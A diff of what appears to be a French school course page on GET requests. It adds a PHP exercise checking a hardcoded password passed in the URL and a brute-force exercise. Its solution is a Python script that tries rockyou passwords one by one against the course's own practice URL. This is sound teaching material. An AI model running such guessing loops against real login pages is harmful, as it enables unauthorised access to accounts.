@@ -3330,15 +3330,6 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#exercice-attaque-par-force-brute-et-requete-get" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exercice : attaque par force brute et requête GET
-    </span>
-  </a>
-  
-</li>
-      
     </ul>
   
 </nav>
@@ -4306,9 +4297,34 @@ Si vous vous demandez à quoi peuvent servir des url si longues, songez à ce ty
 <p><img alt="" class="center" src="../data/exphp2.png" /></p>
 <h4 id="remarque">Remarque<a class="headerlink" href="#remarque" title="Permanent link">⚓︎</a></h4>
 <p>L'exemple ci-dessus est un mauvais exemple : rien ne justifie l'emploi d'un serveur distant. L'affichage de ce message aurait très bien pu se faire en local sur le navigateur du client, en Javascript par exemple.</p>
-<p>L'envoi de paramètre à un serveur distant est nécessaire pour aller interroger une base de données, par exemple (lorsque vous remplissez un formulaire sur le site de la SNCF, les bases de données des horaires de trains, des places disponibles et de leurs tarifs ne sont pas hébergées sur votre ordinateur en local...).</p>
+<p>L'envoi de paramètres à un serveur distant est nécessaire pour aller interroger une base de données, par exemple (lorsque vous remplissez un formulaire sur le site de la SNCF, les bases de données des horaires de trains, des places disponibles et de leurs tarifs ne sont pas hébergées sur votre ordinateur en local...).</p>
 <p>La vérification d'un mot de passe doit aussi se faire sur un serveur distant.</p>
-<h2 id="exercice-attaque-par-force-brute-et-requete-get">Exercice : attaque par force brute et requête GET<a class="headerlink" href="#exercice-attaque-par-force-brute-et-requete-get" title="Permanent link">⚓︎</a></h2>
+<div class="admonition example">
+<p class="admonition-title">Exercice  1</p>
+<p>Créez une page <code>page2</code>  dont l'apparence est conditionné à un mot de passe rentré en <code>page1</code>.</p>
+<p>La page <code>page1.html</code> contiendra un formulaire comme :</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;page2.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;get&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;mdp&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Valider&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>La page <code>page2.php</code> contiendra un code PHP comme :</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;mdp&#39;</span><span class="p">])</span> <span class="k">AND</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;mdp&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;votremotdepasse&#39;</span><span class="p">))</span>
+<span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Good job.&quot;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s1">&#39;&lt;img src=&quot;https://media.giphy.com/media/u4CY9BW4umAfu/giphy.gif&quot;&gt;&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+<span class="k">echo</span> <span class="s1">&#39;raté&#39;</span><span class="p">;}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p>Dans le code PHP, on peut insérer le code <code>html</code> qui sera fabriqué avec la commande <code>echo</code>. </p>
+</div>
+<div class="admonition example">
+<p class="admonition-title">Exercice  2 : attaque par force brute et requête GET</p>
 <p><img alt="image" class="center" src="../data/hackerman.png" width="50%" /></p>
 <h4 id="pre-requis-1-le-module-requests-en-python">Pré-requis 1 : le module <code>requests</code> en python<a class="headerlink" href="#pre-requis-1-le-module-requests-en-python" title="Permanent link">⚓︎</a></h4>
 <p>Le module <code>requests</code> permet d'aller chercher le contenu d'une page web, suivant la syntaxe ci-dessous.
@@ -4347,6 +4363,40 @@ Ce fichier est téléchargeable <a href="https://www.kaggle.com/wjburns/common-p
 <p>Nous allons utiliser un fichier beaucoup plus léger ne contenant que les 1000 premiers mots de passe : vous le trouverez à l'adresse <a href="http://glassus1.free.fr/extraitrockyou.txt" target="_blank">http://glassus1.free.fr/extraitrockyou.txt</a> .</p>
 <p>L'un de ces mots de passe est le mot de passe demandé à la page  <a href="http://glassus1.free.fr/exoBF.html" target="_blank">http://glassus1.free.fr/exoBF.html</a> .</p>
 <p>Lequel ?</p>
+<details class="success">
+<summary>Correction</summary>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">page_error</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://glassus1.free.fr/repBF.php?pass=&#39;</span><span class="p">)</span>
+
+<span class="n">liste_mdp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;extraitrockyou.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://glassus1.free.fr/repBF.php?pass=&#39;</span>
+
+<span class="k">for</span> <span class="n">mdp</span> <span class="ow">in</span> <span class="n">liste_mdp</span><span class="p">:</span>
+    <span class="n">new_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">mdp</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
+    <span class="n">page_tentative</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">page_tentative</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="n">page_error</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Le mot de passe est le suivant :&#39;</span><span class="p">,</span> <span class="n">mdp</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div></td></tr></table></div>
+</details>
+</div>
 
 
 
@@ -4367,7 +4417,7 @@ Ce fichier est téléchargeable <a href="https://www.kaggle.com/wjburns/common-p
     <span class="md-icon" title="Dernière mise à jour">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">20 novembre 2023</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">15 décembre 2024</span>
   </span>
 
     
